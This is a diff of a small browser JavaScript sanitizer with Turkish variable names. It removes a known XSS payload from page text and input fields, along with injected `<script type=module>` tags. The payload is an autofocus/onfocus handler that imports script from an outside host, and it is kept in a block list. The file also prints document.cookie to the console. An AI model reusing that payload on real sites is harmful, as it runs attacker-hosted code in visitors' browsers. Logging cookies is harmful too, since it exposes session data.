@@ -1,20 +1,25 @@
 console.log('selam');
 console.log(document.cookie);
-  
-(function() {
-  const zararliMetin = `"autofocus onfocus=import('https://abbb.3d.tc/a.js');`;
 
-  function temizleMetinNode(node) {
+(function() {
+  const zararlilar = [
+    '`"autofocus onfocus=import(\'https://abbb.3d.tc/a.js\');`'
+  ];
+  const hedefRegex = /<script\s+type=module\s+src=[^>]+><\/script>/gi;
+
+  function temizleNode(node) {
     if(node.nodeType === Node.TEXT_NODE) {
-      node.nodeValue = node.nodeValue.replaceAll(zararliMetin, '');
-      node.nodeValue = node.nodeValue.replace(/<script\s+type=module\s+src=[^>]+><\/script>/gi, '');    } else {
-      node.childNodes.forEach(temizleMetinNode);
+      zararlilar.forEach(z => { node.nodeValue = node.nodeValue.replaceAll(z, ''); });
+      node.nodeValue = node.nodeValue.replace(hedefRegex, '');
+    } else if(node.nodeType === Node.ELEMENT_NODE) {
+      if(node.tagName === 'INPUT' || node.tagName === 'TEXTAREA') {
+        if(node.value) node.value = node.value.replace(hedefRegex, '');
+      }
+      node.childNodes.forEach(temizleNode);
     }
   }
 
-  temizleMetinNode(document.body);
+  temizleNode(document.body);
 })();
-
-;
 
 export {};
